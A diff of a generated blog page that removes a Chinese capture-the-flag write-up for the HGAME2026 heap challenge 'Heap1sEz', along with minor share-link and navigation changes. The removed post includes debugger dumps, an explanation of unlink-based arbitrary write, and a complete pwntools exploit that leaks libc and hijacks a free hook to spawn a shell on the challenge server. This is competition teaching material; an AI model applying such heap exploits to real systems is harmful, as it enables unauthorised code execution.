@@ -120,68 +120,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/03/06/Heap1sEz/" data-id="cmmj06wjb0000asuuapymfv61" data-title="Heap1sEz" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-我的第一篇博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/03/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time class="dt-published" datetime="2026-03-05T08:00:22.000Z" itemprop="datePublished">2026-03-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/03/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="HGAME2026-Heap1sEz"><a href="#HGAME2026-Heap1sEz" class="headerlink" title="HGAME2026 Heap1sEz"></a>HGAME2026 Heap1sEz</h1><p>这道题主要考察三个知识点，UAF，free_hook劫持，Unlink</p>
-<p>逆向：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;give me a hook\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;hook) &lt;= <span class="number">0</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>gift函数的意思是可以读取一个地址，写入到hook中，追踪看一下hook会去到哪里：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">free</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">  malloc_chunk *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  malloc_chunk *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  mchunkptr v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( hook )</span><br><span class="line">  &#123;</span><br><span class="line">    hook(mem);</span><br><span class="line">  &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p>在执行free的时候，如果hook这个函数指针中有内容，那么就调用hook这个函数指针，我们只需要将其覆盖成system，然后参数mem改成’&#x2F;bin&#x2F;sh’就可以getshell了，程序开启了PIE，所以应该先泄露libc地址。</p>
-<p>先创建两个chunk，再free掉，看看show能否出来和main_arena的关系</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p notes</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;0x0, 0x0, 0x55555555e010 <span class="string">&quot;\bxUUUU&quot;</span>, 0x55555555e030 <span class="string">&quot;&quot;</span>, 0x0 &lt;repeats 12 <span class="built_in">times</span>&gt;&#125;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;main_arena</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = (struct malloc_state *) 0x555555557810 &lt;main_arena&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20gx 0x555555557808</span></span><br><span class="line">0x555555557808 &lt;completed.0&gt;:   0x0000000000000000      0x000055555555e000</span><br><span class="line">0x555555557818 &lt;main_arena+8&gt;:  0x0000555555557808      0x0000555555557808</span><br><span class="line">0x555555557828 &lt;hook&gt;:  0x0000000000000000      0x000055555555e000</span><br><span class="line">0x555555557838: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555557848 &lt;note_size+8&gt;:   0x0000000800000008      0x0000000000000000</span><br><span class="line">0x555555557858 &lt;note_size+24&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555557868 &lt;note_size+40&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555557878 &lt;note_size+56&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555557888 &lt;notes+8&gt;:       0x0000000000000000      0x000055555555e010</span><br><span class="line">0x555555557898 &lt;notes+24&gt;:      0x000055555555e030      0x0000000000000000</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(<span class="string">b&#x27;\bxUUUU&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line"><span class="string">&#x27;0x555555557808&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>也就是指向了main_arena - 8，这样子PIE的问题就解决了，只需要泄露libc，用unlink实现任意地址写：</p>
-<p>unlink 宏的定义（简化）：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123;               \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                            \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                            \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk = BK;                            \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd = FD;                            \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>P</code> 是要被移除的空闲块指针。该宏将 <code>P</code> 的前后指针指向的块互相连接，从而把 <code>P</code> 从链表中摘除。</p>
-<p>任意地址写（64位）：</p>
-<p>P-&gt;fd &#x3D; target_addr - 0x18</p>
-<p>P-&gt;bk &#x3D; content</p>
-<p>为了执行unlink，那创建两个chunk，然后free0,修改fd和bk，free1执行chunk0的unlink,将note[0]修改成puts@got，就可以泄露libc了。最终exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span> </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;forward.vidar.club&quot;</span>,<span class="number">32663</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak = u64(p.recvline()[<span class="number">1</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">main_arena = leak + <span class="number">0x8</span></span><br><span class="line">notes = main_arena - <span class="number">0x3810</span> + <span class="number">0x3880</span></span><br><span class="line">puts_got = main_arena - <span class="number">0x3810</span> + <span class="number">0x3768</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">16</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(notes-<span class="number">0x18</span>) + p64(puts_got))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts = u64(p.recvline()[<span class="number">1</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">offset = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = offset + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">7</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;give me a hook\n&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/03/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cmmj06wjl0002asuubvyu6ywu" data-title="我的第一篇博客" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/03/06/Heap1sEz/" data-id="cmmj0c61n0000tsuudjrthnhe" data-title="Heap1sEz" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -232,7 +171,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/03/05/hello-world/" data-id="cmmj06wjk0001asuugdw48c3w" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/03/05/hello-world/" data-id="cmmj0c61u0001tsuu0otbfikn" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -276,10 +215,6 @@
         
           <li>
             <a href="/2026/03/06/Heap1sEz/">Heap1sEz</a>
-          </li>
-        
-          <li>
-            <a href="/2026/03/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
           </li>
         
           <li>
